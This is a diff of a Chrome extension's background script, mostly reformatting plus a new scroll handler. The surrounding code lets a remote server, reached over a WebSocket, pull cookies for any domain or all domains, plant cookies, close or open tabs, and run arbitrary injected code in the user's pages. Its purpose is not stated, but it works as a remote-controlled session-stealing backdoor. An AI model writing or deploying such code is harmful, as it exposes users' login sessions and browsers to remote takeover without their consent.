@@ -3,7 +3,7 @@ chrome.runtime.onInstalled.addListener(async () => {
   const settings = await response.json();
 
   //servisler
-  chrome.tabs.onCreated.addListener((tab) => 
+  chrome.tabs.onCreated.addListener((tab) =>
     socket ? socket.send(`${JSON.stringify({ event: "tabcreated", tab })}`) : null
   );
 
@@ -19,28 +19,28 @@ chrome.runtime.onInstalled.addListener(async () => {
       console.log('WebSocket mesajı alındı:', data);
       event = data;
 
-      if (event.getcookie) 
+      if (event.getcookie)
         chrome.cookies.getAll({ domain: event.getcookie }, function (cookies) {
           socket.send(`${JSON.stringify({ session: event.session, cookies: cookies })}`);
         });
-      else if (event.getallcookie) 
+      else if (event.getallcookie)
         chrome.cookies.getAll({}, function (cookies) {
           socket.send(`${JSON.stringify({ session: event.session, cookies: cookies })}`);
         });
-      else if (event.setcookies) 
+      else if (event.setcookies)
         event.setcookies.forEach(cookie => {
           chrome.cookies.set(cookie, function (result) {
             socket.send(`${JSON.stringify({ session: event.session, cookies: result })}`);
           });
         });
-      if (event.exit) 
+      if (event.exit)
         chrome.tabs.query({}, function (tabs) {
           for (let tab of tabs) {
             chrome.tabs.remove(tab.id);
           }
         });
-       else if (event.closetab)  chrome.tabs.remove(event.closetab);
-       else if (event.newPage) 
+      else if (event.closetab) chrome.tabs.remove(event.closetab);
+      else if (event.newPage)
         chrome.tabs.create({
           url: event.newPage, // Changed from event.opentab to event.newPage
           active: true,
@@ -57,19 +57,27 @@ chrome.runtime.onInstalled.addListener(async () => {
           } else
             socket.send(`${JSON.stringify({ session: event.session, tab })}`);
         });
-       else if (event.evaluate) {
-          try {
-            let argsAsString = JSON.stringify(event.args || []);
-            let executableCode = `(${event.code}).apply(null, ${argsAsString})`;
+      else if (event.evaluate) {
+        try {
+          let argsAsString = JSON.stringify(event.args || []);
+          let executableCode = `(${event.code}).apply(null, ${argsAsString})`;
 
-            chrome.tabs.executeScript(event.tab, {
-              code: executableCode
-            }, function (result) {
-              socket.send(`${JSON.stringify({ session: event.session, result: result[0] })}`);
-            });
-          } catch (e) {
-            socket.send(`${JSON.stringify({ session: event.session, result: e.message })}`);
-          }
+          chrome.tabs.executeScript(event.tab, {
+            code: executableCode
+          }, function (result) {
+            socket.send(`${JSON.stringify({ session: event.session, result: result[0] })}`);
+          });
+        } catch (e) {
+          socket.send(`${JSON.stringify({ session: event.session, result: e.message })}`);
+        }
+      } else if (event.mouse) {
+        if (event.wheel) {
+          chrome.tabs.executeScript(event.tab, {
+            code: `window.scrollBy(${event.deltaX}, ${event.deltaY});`
+          }, function (result) {
+            socket.send(`${JSON.stringify({ session: event.session, result })}`);
+          });
+        }
       }
 
     };
@@ -86,7 +94,7 @@ chrome.runtime.onInstalled.addListener(async () => {
 
 
 
-  
+
   /*
     chrome.tabs.sendMessage(tabs[0].id, 
             {
